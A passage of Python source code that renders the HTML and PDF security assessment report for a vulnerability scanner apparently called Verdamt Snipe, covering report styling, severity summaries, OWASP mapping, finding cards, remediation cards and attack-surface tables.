        .tab { padding: 14px 24px; cursor: pointer; border-bottom: 2px solid transparent; font-weight: 600; font-size: 13px; color: var(--text-dim); transition: all 0.3s ease; letter-spacing: 0.3px; user-select: none; }
        .tab:hover { color: var(--text); background: rgba(255,255,255,0.02); }
        .tab.active { color: var(--primary); border-bottom-color: var(--primary); }
        .tab-icon { margin-right: 6px; }

        /* ═══ Container ═══ */
        .container { max-width: 1280px; margin: 0 auto; padding: 30px 24px 60px; }
        .page { display: none; animation: fadeSlideIn 0.4s ease; }
        .page.active { display: block; }
        @keyframes fadeSlideIn { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }

        /* ═══ Grid & Panels ═══ */
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 24px; }
        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 24px; }
        .panel { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid var(--glass-border); border-radius: 12px; padding: 24px; transition: border-color 0.3s, box-shadow 0.3s; }
        .panel:hover { border-color: var(--border-light); box-shadow: 0 4px 24px rgba(0,0,0,0.2); }
        .panel h3 { color: var(--text-dim); font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 14px; font-weight: 600; }
        .panel-glow { border-color: var(--primary); box-shadow: 0 0 20px var(--primary-glow); }

        /* ═══ Stats ═══ */
        .stat-val { font-size: 32px; font-weight: 800; font-family: 'JetBrains Mono', monospace; line-height: 1.2; }
        .stat-sub { font-size: 13px; color: var(--text-muted); margin-top: 6px; }
        .stat-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
        .stat-row:last-child { border-bottom: none; }
        .stat-label { color: var(--text-muted); }
        .stat-value { color: var(--text); font-family: 'JetBrains Mono', monospace; font-weight: 600; }

        /* ═══ Severity Summary Boxes ═══ */
        .sev-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-top: 16px; }
        .sev-box { padding: 16px; border-radius: 10px; text-align: center; border: 1px solid var(--border); position: relative; overflow: hidden; transition: transform 0.2s, box-shadow 0.2s; cursor: default; }
        .sev-box:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
        .sev-box .sev-num { font-size: 28px; font-weight: 800; font-family: 'JetBrains Mono', monospace; position: relative; z-index: 1; }
        .sev-box .sev-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-top: 4px; position: relative; z-index: 1; }
        .sev-crit { background: var(--crit-bg); border-color: rgba(239,68,68,0.3); }
        .sev-crit .sev-num { color: var(--crit); }
        .sev-high { background: var(--high-bg); border-color: rgba(249,115,22,0.3); }
        .sev-high .sev-num { color: var(--high); }
        .sev-med { background: var(--med-bg); border-color: rgba(234,179,8,0.3); }
        .sev-med .sev-num { color: var(--med); }
        .sev-low { background: var(--low-bg); border-color: rgba(34,197,94,0.3); }
        .sev-low .sev-num { color: var(--low); }
        .sev-info { background: var(--info-bg); border-color: rgba(100,116,139,0.3); }
        .sev-info .sev-num { color: var(--info); }

        /* ═══ Level Bar ═══ */
        .level-bar { height: 8px; background: var(--border); border-radius: 4px; overflow: hidden; margin-top: 12px; }
        .level-fill { height: 100%; background: linear-gradient(90deg, var(--low), var(--med), var(--crit)); transition: width 1s ease; }

        /* ═══ Section Headers ═══ */
        .section-header { margin-bottom: 24px; }
        .section-header h2 { font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
        .section-header p { color: var(--text-muted); font-size: 13px; margin-top: 4px; }

        /* ═══ Cards (Findings) ═══ */
        .finding-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 16px; transition: border-color 0.3s; }
        .finding-card:hover { border-color: var(--border-light); }
        .finding-header { padding: 16px 20px; border-bottom: 1px solid var(--border); background: var(--surface-hover); display: flex; align-items: center; cursor: pointer; user-select: none; gap: 12px; transition: background 0.2s; }
        .finding-header:hover { background: rgba(255,255,255,0.04); }
        .finding-chevron { color: var(--text-dim); transition: transform 0.3s ease; font-size: 12px; flex-shrink: 0; }
        .finding-card.open .finding-chevron { transform: rotate(90deg); }
        .finding-body { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; }
        .finding-card.open .finding-body { max-height: 5000px; }
        .finding-content { padding: 20px; }
        .badge { padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; flex-shrink: 0; }
        .badge-crit { background: var(--crit); color: #fff; }
        .badge-high { background: var(--high); color: #000; }
        .badge-med { background: var(--med); color: #000; }
        .badge-low { background: var(--low); color: #000; }
        .badge-info { background: var(--info); color: #fff; }
        .badge-verified { background: rgba(34,197,94,0.15); color: var(--low); border: 1px solid rgba(34,197,94,0.3); }
        .finding-id { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); flex-shrink: 0; }
        .finding-title { font-weight: 600; font-size: 14px; flex: 1; }
        .finding-meta { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; padding: 14px; background: rgba(0,0,0,0.2); border-radius: 8px; font-size: 13px; }
        .finding-meta dt { color: var(--text-dim); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
        .finding-meta dd { color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 12px; margin-top: 2px; word-break: break-all; }

        /* ═══ Steps ═══ */
        .steps-container { display: flex; flex-direction: column; gap: 12px; }
        .step { background: rgba(0,0,0,0.25); border: 1px solid var(--border); border-radius: 8px; padding: 16px; position: relative; }
        .step-highlight { border-left: 3px solid var(--crit); }
        .step-number { position: absolute; top: 16px; left: 16px; width: 24px; height: 24px; background: var(--primary); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; }
        .step-inner { padding-left: 36px; }
        .step-title { font-weight: 600; color: var(--primary); margin-bottom: 6px; font-size: 13px; }
        .step-desc { font-size: 13px; color: var(--text); line-height: 1.7; white-space: pre-wrap; }
        pre { background: #000; border: 1px solid var(--border); border-radius: 6px; padding: 14px; margin-top: 10px; overflow-x: auto; }
        code { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #a6e22e; }

        /* ═══ Filter Bar ═══ */
        .filter-bar { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; margin-bottom: 20px; padding: 16px; background: var(--glass); backdrop-filter: blur(12px); border: 1px solid var(--glass-border); border-radius: 10px; }
        .filter-btn { padding: 6px 14px; border-radius: 6px; border: 1px solid var(--border); background: transparent; color: var(--text-muted); font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s; font-family: 'Inter', sans-serif; }
        .filter-btn:hover { background: rgba(255,255,255,0.05); color: var(--text); }
        .filter-btn.active { background: var(--primary); color: #fff; border-color: var(--primary); }
        .search-input { flex: 1; min-width: 200px; padding: 8px 14px; border-radius: 6px; border: 1px solid var(--border); background: rgba(0,0,0,0.3); color: var(--text); font-size: 13px; font-family: 'Inter', sans-serif; outline: none; transition: border-color 0.2s; }
        .search-input:focus { border-color: var(--primary); }
        .search-input::placeholder { color: var(--text-dim); }

        /* ═══ OWASP Table ═══ */
        .owasp-table { width: 100%; border-collapse: collapse; margin-top: 16px; font-size: 13px; }
        .owasp-table th { text-align: left; padding: 12px 16px; background: rgba(0,0,0,0.3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid var(--border); }
        .owasp-table td { padding: 12px 16px; border-bottom: 1px solid var(--border); vertical-align: top; }
        .owasp-table tr:hover td { background: rgba(255,255,255,0.02); }
        .owasp-id { font-family: 'JetBrains Mono', monospace; color: var(--primary); font-weight: 700; font-size: 12px; }
        .owasp-count { font-family: 'JetBrains Mono', monospace; font-weight: 700; }

        /* ═══ Findings Index Table ═══ */
        .findings-table { width: 100%; border-collapse: collapse; margin-top: 16px; font-size: 13px; }
        .findings-table th { text-align: left; padding: 10px 14px; background: rgba(0,0,0,0.3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid var(--border); }
        .findings-table td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
        .findings-table tr:hover td { background: rgba(255,255,255,0.02); }

        /* ═══ Recommendations ═══ */
        .rec-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 16px; }
        .rec-priority { display: inline-block; padding: 3px 8px; border-radius: 4px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-right: 10px; }

        /* ═══ Tech Stack Tags ═══ */
        .tech-tag { display: inline-block; padding: 4px 12px; background: var(--accent-glow); color: var(--accent); border: 1px solid rgba(139,92,246,0.3); border-radius: 20px; font-size: 12px; font-weight: 600; margin: 3px 4px 3px 0; }

        /* ═══ Footer ═══ */
        .report-footer { text-align: center; padding: 30px; border-top: 1px solid var(--border); margin-top: 40px; color: var(--text-dim); font-size: 11px; }

        /* ═══ Back to top ═══ */
        .back-to-top { position: fixed; bottom: 30px; right: 30px; width: 40px; height: 40px; border-radius: 50%; background: var(--primary); color: #fff; border: none; cursor: pointer; font-size: 18px; display: none; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(59,130,246,0.4); transition: opacity 0.3s, transform 0.3s; z-index: 1000; }
        .back-to-top:hover { transform: scale(1.1); }
        """

        if for_pdf:
            css += """
            @page {
                size: A4 portrait;
                margin: 10mm;
                background: #09090b !important;
            }
            *, *::before, *::after {
                -webkit-print-color-adjust: exact !important;
                print-color-adjust: exact !important;
                color-adjust: exact !important;
            }
            html {
                background: #09090b !important;
            }
            body {
                background: #09090b !important;
                background-color: #09090b !important;
                color: #e4e4e7 !important;
            }
            .cover {
                background: #09090b !important;
                background-color: #09090b !important;
                min-height: auto !important;
                padding: 40px 20px !important;
                page-break-after: always !important;
            }
            .cover::before {
                display: none !important;
                background: none !important;
            }
            .cover-title {
                background: none !important;
                -webkit-text-fill-color: #3b82f6 !important;
                color: #3b82f6 !important;
            }
            .cover-subtitle {
                color: #a1a1aa !important;
            }
            .cover-classification {
                color: #ef4444 !important;
                border-color: #ef4444 !important;
            }
            .main-header, .tabs, .back-to-top, .filter-bar, .cover-scroll-hint {
                display: none !important;
            }
            .container {
                background: #09090b !important;
            }
            .page {
                display: block !important;
                opacity: 1 !important;
                transform: none !important;
                background: transparent !important;
            }
            .panel, .finding-card, .rec-card, .step, .sev-box, .cover-meta-item {
                background: #18181b !important;
                background-color: #18181b !important;
                border-color: #27272a !important;
                color: #e4e4e7 !important;
                box-shadow: none !important;
            }
            .finding-header {
                background: #1f1f23 !important;
                background-color: #1f1f23 !important;
                color: #e4e4e7 !important;
            }
            .finding-body {
                max-height: none !important;
                overflow: visible !important;
                display: block !important;
            }
            .finding-card, .panel, .rec-card {
                page-break-inside: avoid !important;
                break-inside: avoid !important;
                margin-bottom: 14px !important;
            }
            .finding-meta {
                background: rgba(0,0,0,0.4) !important;
            }
            pre {
                background: #09090b !important;
                background-color: #09090b !important;
                border-color: #27272a !important;
            }
            code {
                color: #4ade80 !important;
            }
            .stat-val, .sev-num, .owasp-id, .cover-title {
                color: #3b82f6 !important;
                -webkit-text-fill-color: #3b82f6 !important;
            }
            .stat-label, .cover-meta-label {
                color: #71717a !important;
            }
            .stat-value, .cover-meta-value {
                color: #e4e4e7 !important;
            }
            h2, h3, .section-header h2 {
                color: #e4e4e7 !important;
            }
            .section-header p {
                color: #a1a1aa !important;
            }
            a { color: #3b82f6 !important; text-decoration: none !important; }
            .report-footer {
                background: transparent !important;
                color: #71717a !important;
            }
            /* Tables */
            .owasp-table, .findings-table {
                background: transparent !important;
            }
            .owasp-table th, .findings-table th {
                background: rgba(0,0,0,0.3) !important;
                color: #a1a1aa !important;
            }
            .owasp-table td, .findings-table td {
                border-color: #27272a !important;
                color: #e4e4e7 !important;
            }
            /* Severity boxes */
            .sev-crit { background: rgba(239,68,68,0.1) !important; }
            .sev-crit .sev-num { color: #ef4444 !important; }
            .sev-high { background: rgba(249,115,22,0.1) !important; }
            .sev-high .sev-num { color: #f97316 !important; }
            .sev-med { background: rgba(234,179,8,0.1) !important; }
            .sev-med .sev-num { color: #eab308 !important; }
            .sev-low { background: rgba(34,197,94,0.1) !important; }
            .sev-low .sev-num { color: #22c55e !important; }
            .sev-info { background: rgba(100,116,139,0.1) !important; }
            .sev-info .sev-num { color: #64748b !important; }
            .sev-label { color: #a1a1aa !important; }
            /* Tech tags */
            .tech-tag {
                background: rgba(139,92,246,0.15) !important;
                color: #8b5cf6 !important;
                border-color: rgba(139,92,246,0.3) !important;
            }
            /* Badges */
            .badge-crit { background: #ef4444 !important; color: #fff !important; }
            .badge-high { background: #f97316 !important; color: #000 !important; }
            .badge-med { background: #eab308 !important; color: #000 !important; }
            .badge-low { background: #22c55e !important; color: #000 !important; }
            .badge-info { background: #64748b !important; color: #fff !important; }
            /* Steps */
            .step-number { background: #3b82f6 !important; color: #fff !important; }
            .step-title { color: #3b82f6 !important; }
            .step-desc { color: #e4e4e7 !important; }
            /* Grid */
            .grid, .grid-3, .sev-grid {
                background: transparent !important;
            }
            """
        return css

    def _generate_html(self, for_pdf: bool = False) -> str:
        target_lvl = self._calc_target_level()
        risk_rating = self._calc_risk_rating()

        sev_badge_class = {"Critical": "badge-crit", "High": "badge-high", "Medium": "badge-med", "Low": "badge-low", "Info": "badge-info"}
        risk_colors = {"Critical": "#ef4444", "High": "#f97316", "Medium": "#eab308", "Low": "#22c55e", "Informational": "#64748b", "None": "#64748b"}
        risk_color = risk_colors.get(risk_rating, "#64748b")

        counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for f in self.findings:
            sev = finding_cvss(f)["v"]
            counts[sev] = counts.get(sev, 0) + 1

        avg_cvss = 0.0
        if self.findings:
            scores = [finding_cvss(f)["s"] for f in self.findings if finding_cvss(f)["s"] > 0]
            avg_cvss = sum(scores) / len(scores) if scores else 0.0

        donut_svg = self._svg_donut_chart(counts)
        gauge_svg = self._svg_cvss_gauge(avg_cvss)
        heatmap_html = self._risk_heatmap(counts)

        waf_html = html.escape(', '.join(self.waf_detected) if self.waf_detected else 'None Detected')
        tech_tags = ''.join(f'<span class="tech-tag">{html.escape(t)}</span>' for t in self.tech_stack) if self.tech_stack else '<span style="color:var(--text-dim);">Auto-detection found no identifiable frameworks</span>'
        scan_ts = self.scan_time.strftime('%Y-%m-%d %H:%M:%S')

        # OWASP Mapping
        try:
            from reports.owasp_mapper import get_owasp_summary
            owasp_data = get_owasp_summary(self.findings)
        except ImportError:
            owasp_data = {}

        owasp_rows = ""
        for oid, odata in owasp_data.items():
            owasp_rows += f'''<tr>
                <td><span class="owasp-id">{oid}</span></td>
                <td style="font-weight:600;">{html.escape(odata["name"])}</td>
                <td style="color:var(--text-muted); font-size:12px;">{html.escape(odata["desc"][:120])}</td>
                <td class="owasp-count" style="text-align:center;">{odata["count"]}</td>
            </tr>'''
        if not owasp_rows:
            owasp_rows = '<tr><td colspan="4" style="text-align:center; color:var(--text-dim); padding:24px;">No OWASP-mapped findings</td></tr>'

        # Findings Index Table
        index_rows = ""
        for idx, fd in enumerate(self.findings, 1):
            cv = finding_cvss(fd)
            sev = cv["v"]
            bc = sev_badge_class.get(sev, "badge-info")
            index_rows += f'''<tr>
                <td><span class="finding-id">VS-{idx:03d}</span></td>
                <td><span class="badge {bc}" style="font-size:10px;">{sev}</span></td>
                <td style="font-weight:500;">{html.escape(fd.get("title",""))}</td>
                <td style="font-family:'JetBrains Mono',monospace; font-size:12px;">{cv["s"]}</td>
                <td style="color:var(--text-muted); font-size:12px; max-width:250px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">{html.escape(fd.get("url","")[:60])}</td>
            </tr>'''

        # Finding Cards
        cards_html = ""
        for idx, fd in enumerate(self.findings, 1):
            cv = finding_cvss(fd)
            sev = cv["v"]
            bc = sev_badge_class.get(sev, "badge-info")
            confidence = html.escape(fd.get("confidence", "suspected").capitalize())
            ftype = html.escape(fd.get("type", "unknown"))

            # OWASP mapping for individual finding
            try:
                from reports.owasp_mapper import map_finding_to_owasp
                owasp_info = map_finding_to_owasp(fd.get("type", ""))
                owasp_badge = f'<span style="font-family:JetBrains Mono,monospace; font-size:11px; color:var(--accent); margin-left:8px;">{owasp_info["id"]}: {html.escape(owasp_info["name"])}</span>' if owasp_info else ""
            except ImportError:
                owasp_badge = ""

            steps = PoCGenerator.generate_steps(fd, self.tech_stack)
            steps_html = ""
            for si, step in enumerate(steps, 1):
                hl_class = " step-highlight" if step.get("highlight") else ""
                code_block = f'<pre><code>{html.escape(step["code"])}</code></pre>' if "code" in step else ""
                steps_html += f'''
                <div class="step{hl_class}">
                    <div class="step-number">{si}</div>
                    <div class="step-inner">
                        <div class="step-title">{html.escape(step["title"])}</div>
                        <div class="step-desc">{html.escape(step["desc"])}</div>
                        {code_block}
                    </div>
                </div>'''

            poc_badge = '<span class="badge badge-verified" style="font-size:10px;">✓ Playwright Verified</span>' if fd.get("confidence") == "confirmed" else ""
            open_class = " open" if for_pdf else ""

            cards_html += f'''
            <div class="finding-card{open_class}" data-severity="{sev}" data-title="{html.escape(fd.get('title',''))}" data-url="{html.escape(fd.get('url',''))}" data-type="{ftype}">
                <div class="finding-header" onclick="toggleCard(this)">
                    <span class="finding-chevron">▶</span>
                    <span class="badge {bc}">{sev}</span>
                    {poc_badge}
                    <span class="finding-id">VS-{idx:03d}</span>
                    <span class="finding-title">{html.escape(fd.get("title", ""))}</span>
                    {owasp_badge}
                </div>
                <div class="finding-body">
                    <div class="finding-content">
                        <div class="finding-meta">
                            <div><dt>Target URL</dt><dd>{html.escape(fd.get("url",""))}</dd></div>
                            <div><dt>CVSS Score</dt><dd>{cv["s"]} — {cv["vec"]}</dd></div>
                            <div><dt>Confidence</dt><dd>{confidence}</dd></div>
                            <div><dt>Type</dt><dd>{ftype}</dd></div>
                        </div>
                        <div class="steps-container">{steps_html}</div>
                    </div>
                </div>
            </div>'''

        if not cards_html:
            cards_html = '<div style="text-align:center; padding:60px; color:var(--text-dim);"><div style="font-size:48px; margin-bottom:16px;">✓</div><div style="font-size:16px; font-weight:600;">No findings detected during this assessment.</div></div>'

        # Recommendations Tab
        rec_cards = ""
        seen_types = set()
        for fd in self.findings:
            ftype = fd.get("type", "")
            if ftype in seen_types:
                continue
            seen_types.add(ftype)
            cv = finding_cvss(fd)
            sev = cv["v"]
            bc = sev_badge_class.get(sev, "badge-info")

            from reports.remediation import ContextAwareFixGenerator
            fix = ContextAwareFixGenerator.generate_fix(ftype, self.tech_stack or [])
            code_block = f'<pre><code>{html.escape(fix["code"])}</code></pre>' if fix.get("code") else ""
            count = sum(1 for f2 in self.findings if f2.get("type") == ftype)

            rec_cards += f'''
            <div class="rec-card">
                <div style="display:flex; align-items:center; gap:10px; margin-bottom:12px;">
                    <span class="rec-priority badge {bc}">{sev}</span>
                    <span style="font-weight:700; font-size:14px;">{html.escape(ftype.replace("_"," ").title())}</span>
                    <span style="color:var(--text-dim); font-size:12px;">— {count} finding{"s" if count>1 else ""}</span>
                </div>
                <div style="font-size:13px; color:var(--text); line-height:1.7; margin-bottom:10px;">{html.escape(fix["desc"])}</div>
                {code_block}
            </div>'''
        if not rec_cards:
            rec_cards = '<div style="text-align:center; padding:40px; color:var(--text-dim);">No remediation recommendations — no actionable findings detected.</div>'

        # Services table
        services_rows = ""
        for svc in self.services[:50]:
            port = svc.get("port", "—")
            service_name = html.escape(str(svc.get("service", svc.get("name", "—"))))
            status = html.escape(str(svc.get("status", "open")))
            banner = html.escape(str(svc.get("banner", svc.get("server", "—")))[:80])
            services_rows += f'<tr><td style="font-family:JetBrains Mono,monospace;">{port}</td><td>{service_name}</td><td>{status}</td><td style="color:var(--text-muted); font-size:12px;">{banner}</td></tr>'
        if not services_rows:
            services_rows = '<tr><td colspan="4" style="text-align:center; color:var(--text-dim); padding:24px;">No services discovered</td></tr>'

        # Subdomains list
        subs_html = ""
        for sub in self.subs[:100]:
            subs_html += f'<div style="padding:6px 12px; font-family:JetBrains Mono,monospace; font-size:12px; border-bottom:1px solid var(--border);">{html.escape(sub)}</div>'
        if not subs_html:
            subs_html = '<div style="text-align:center; padding:24px; color:var(--text-dim);">No subdomains discovered</div>'

        # JavaScript
        tab_js = "" if for_pdf else """
    <script>
        // Tab navigation
        function showPage(pageId, el) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.getElementById(pageId).classList.add('active');
            el.classList.add('active');
        }

        // Collapsible cards
        function toggleCard(header) {
            header.closest('.finding-card').classList.toggle('open');
        }

        // Severity filter
        let activeFilters = new Set();
        function toggleFilter(btn, severity) {
            btn.classList.toggle('active');
            if (activeFilters.has(severity)) {
                activeFilters.delete(severity);
            } else {
                activeFilters.add(severity);
            }
            applyFilters();
        }

        // Search filter
        function searchFindings(query) {
            const q = query.toLowerCase();
            document.querySelectorAll('.finding-card').forEach(card => {
                const title = (card.dataset.title || '').toLowerCase();
                const url = (card.dataset.url || '').toLowerCase();
                const type = (card.dataset.type || '').toLowerCase();
                const sev = card.dataset.severity;
                const matchSearch = !q || title.includes(q) || url.includes(q) || type.includes(q);
                const matchFilter = activeFilters.size === 0 || activeFilters.has(sev);
                card.style.display = (matchSearch && matchFilter) ? '' : 'none';
            });
        }

        function applyFilters() {
            const q = document.getElementById('findingSearch');
            searchFindings(q ? q.value : '');
        }

        // Expand/collapse all
        function expandAll() {
            document.querySelectorAll('.finding-card').forEach(c => c.classList.add('open'));
        }
        function collapseAll() {
            document.querySelectorAll('.finding-card').forEach(c => c.classList.remove('open'));
        }

        // Back to top
        window.addEventListener('scroll', () => {
            const btn = document.getElementById('backToTop');
            if (btn) btn.style.display = window.scrollY > 400 ? 'flex' : 'none';
        });
        function scrollToTop() { window.scrollTo({ top: 0, behavior: 'smooth' }); }
    </script>"""

        cover_display = "flex" if not for_pdf else "flex"
        all_pages_active = for_pdf

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Security Assessment Report for {html.escape(self.target)} — Generated by Verdamt Snipe v{self.version}">
    <title>Security Assessment — {html.escape(self.target)} — Verdamt Snipe</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>{self._generate_css(for_pdf)}</style>
</head>
<body>

    <!-- ═══════════ COVER PAGE ═══════════ -->
    <div class="cover" style="display:{cover_display}">
        <div class="cover-logo">☠</div>
        <div class="cover-title">VERDAMT SNIPE</div>
        <div class="cover-subtitle">Security Assessment Report</div>
        <div class="cover-meta">
            <div class="cover-meta-item">
                <div class="cover-meta-label">Target</div>
                <div class="cover-meta-value">{html.escape(self.target)}</div>
            </div>
            <div class="cover-meta-item">
                <div class="cover-meta-label">Date</div>
                <div class="cover-meta-value">{scan_ts}</div>
            </div>
            <div class="cover-meta-item">
                <div class="cover-meta-label">Report ID</div>
                <div class="cover-meta-value">{self.report_id}</div>
            </div>
            <div class="cover-meta-item">
                <div class="cover-meta-label">Risk Rating</div>
                <div class="cover-meta-value" style="color:{risk_color};">{risk_rating}</div>
            </div>
            <div class="cover-meta-item">
                <div class="cover-meta-label">Assessor</div>
                <div class="cover-meta-value">{html.escape(self.author)}</div>
            </div>
            <div class="cover-meta-item">
                <div class="cover-meta-label">Scan Mode</div>
                <div class="cover-meta-value">{self.mode.upper()}</div>
            </div>
        </div>
        <div class="cover-classification">CONFIDENTIAL — For Authorized Personnel Only</div>
        {'<div class="cover-scroll-hint">▼ Scroll to view report</div>' if not for_pdf else ''}
    </div>

    <!-- ═══════════ STICKY HEADER ═══════════ -->
    <div class="main-header">
        <h1><span style="color:var(--primary)">☠</span> VERDAMT SNIPE</h1>
        <div class="header-meta">
            <span class="header-id">{self.report_id}</span>
            <span>v{self.version}</span>
            <span>{html.escape(self.target)}</span>
        </div>
    </div>

    <!-- ═══════════ TABS ═══════════ -->
    <div class="tabs">
        <div class="tab active" onclick="showPage('exec-summary', this)"><span class="tab-icon">📊</span>Executive Summary</div>
        <div class="tab" onclick="showPage('attack-surface', this)"><span class="tab-icon">🎯</span>Attack Surface</div>
        <div class="tab" onclick="showPage('killchain', this)"><span class="tab-icon">⚔</span>Kill Chain & PoC</div>
        <div class="tab" onclick="showPage('recommendations', this)"><span class="tab-icon">🛡</span>Recommendations</div>
    </div>

    <div class="container">

        <!-- ═══════════ TAB 1: EXECUTIVE SUMMARY ═══════════ -->
        <div id="exec-summary" class="page active">
            <div class="section-header">
                <h2>📊 Executive Summary</h2>
                <p>High-level security posture overview and risk assessment for {html.escape(self.target)}</p>
            </div>

            <!-- Key Metrics -->
            <div class="grid-3">
                <div class="panel" style="text-align:center;">
                    <h3>Severity Distribution</h3>
                    <div style="display:flex; justify-content:center; margin:10px 0;">{donut_svg}</div>
                </div>
                <div class="panel" style="text-align:center;">
                    <h3>Average CVSS Score</h3>
                    <div style="display:flex; justify-content:center; margin:10px 0;">{gauge_svg}</div>
                </div>
                <div class="panel">
                    <h3>Assessment Overview</h3>
                    <div class="stat-row"><span class="stat-label">Target</span><span class="stat-value">{html.escape(self.target)}</span></div>
                    <div class="stat-row"><span class="stat-label">Scan Mode</span><span class="stat-value" style="color:var(--primary);">{self.mode.upper()}</span></div>
                    <div class="stat-row"><span class="stat-label">Duration</span><span class="stat-value">{self.duration:.1f}s</span></div>
                    <div class="stat-row"><span class="stat-label">Total Findings</span><span class="stat-value">{len(self.findings)}</span></div>
                    <div class="stat-row"><span class="stat-label">Risk Rating</span><span class="stat-value" style="color:{risk_color};">{risk_rating}</span></div>
                    <div class="stat-row"><span class="stat-label">WAF</span><span class="stat-value">{waf_html}</span></div>
                </div>
            </div>

            <!-- Severity Boxes -->
            <div class="panel">
                <h3>Vulnerability Severity Breakdown</h3>
                <div class="sev-grid">
                    <div class="sev-box sev-crit"><div class="sev-num">{counts["Critical"]}</div><div class="sev-label">Critical</div></div>
                    <div class="sev-box sev-high"><div class="sev-num">{counts["High"]}</div><div class="sev-label">High</div></div>
                    <div class="sev-box sev-med"><div class="sev-num">{counts["Medium"]}</div><div class="sev-label">Medium</div></div>
                    <div class="sev-box sev-low"><div class="sev-num">{counts["Low"]}</div><div class="sev-label">Low</div></div>
                </div>
                <div style="margin-top:16px;">
                    <h3 style="color:var(--text-dim); font-size:11px; text-transform:uppercase; letter-spacing:1.5px; margin-bottom:8px;">Risk Heatmap</h3>
                    {heatmap_html}
                </div>
            </div>

            <!-- OWASP Mapping -->
            <div class="panel" style="margin-top:20px;">
                <h3>OWASP Top 10 (2021) Coverage</h3>
                <table class="owasp-table">
                    <thead><tr><th>ID</th><th>Category</th><th>Description</th><th style="text-align:center;">Findings</th></tr></thead>
                    <tbody>{owasp_rows}</tbody>
                </table>
            </div>

            <!-- Findings Index -->
            <div class="panel" style="margin-top:20px;">
                <h3>Findings Index</h3>
                <table class="findings-table">
                    <thead><tr><th>ID</th><th>Severity</th><th>Title</th><th>CVSS</th><th>Target</th></tr></thead>
                    <tbody>{index_rows if index_rows else '<tr><td colspan="5" style="text-align:center; color:var(--text-dim); padding:24px;">No findings</td></tr>'}</tbody>
                </table>
            </div>

            <!-- Narrative -->
            <div class="panel" style="margin-top:20px;">
                <h3>Assessment Narrative</h3>
                <p style="color:var(--text); font-size:13px; line-height:1.8; max-width:900px;">
                    A comprehensive security assessment was conducted against <strong>{html.escape(self.target)}</strong> using
                    Verdamt Snipe v{self.version} in <strong>{self.mode.upper()}</strong> mode. The automated assessment
                    validated <strong>{len(self.urls)}</strong> unique URLs across <strong>{len(self.services)}</strong> active services,
                    with <strong>{len(self.subs)}</strong> subdomains enumerated.
                    {"<strong style='color:var(--high);'>WAF protection (" + waf_html + ") was identified</strong>, which may have impacted payload delivery and resulted in false negatives." if self.waf_detected else "No active Web Application Firewall was identified during the scan."}
                    A total of <strong>{len(self.findings)}</strong> findings were identified, with an overall risk rating of
                    <strong style="color:{risk_color};">{risk_rating}</strong>.
                    {"Immediate remediation is recommended for all Critical and High severity findings." if counts["Critical"] + counts["High"] > 0 else "No critical or high severity issues were identified during this assessment."}
                </p>
            </div>
        </div>

        <!-- ═══════════ TAB 2: ATTACK SURFACE ═══════════ -->
        <div id="attack-surface" class="page{' active' if all_pages_active else ''}">
            <div class="section-header">
                <h2>🎯 Attack Surface Analysis</h2>
                <p>Discovered services, subdomains, technology stack, and reconnaissance intelligence</p>
            </div>

            <div class="grid">
                <div class="panel">
                    <h3>Target Difficulty</h3>
                    <div class="stat-val" style="color:var(--accent);">Level {target_lvl} <span style="font-size:16px; color:var(--text-muted);">/ 10</span></div>
                    <div class="level-bar"><div class="level-fill" style="width:{target_lvl * 10}%;"></div></div>
                    <div class="stat-sub" style="margin-top:12px;">Based on TLD classification, brand profile, service count, and WAF presence</div>
                </div>
                <div class="panel">
                    <h3>Surface Statistics</h3>
                    <div class="stat-row"><span class="stat-label">Active Services</span><span class="stat-value">{len(self.services)}</span></div>
                    <div class="stat-row"><span class="stat-label">Subdomains</span><span class="stat-value">{len(self.subs)}</span></div>
                    <div class="stat-row"><span class="stat-label">Validated URLs</span><span class="stat-value">{len(self.urls)}</span></div>
                    <div class="stat-row"><span class="stat-label">WAF Defense</span><span class="stat-value" style="color:{'var(--crit)' if self.waf_detected else 'var(--low)'};">{waf_html}</span></div>
                </div>
            </div>

            <!-- Technology Stack -->
            <div class="panel">
                <h3>Detected Technology Stack</h3>
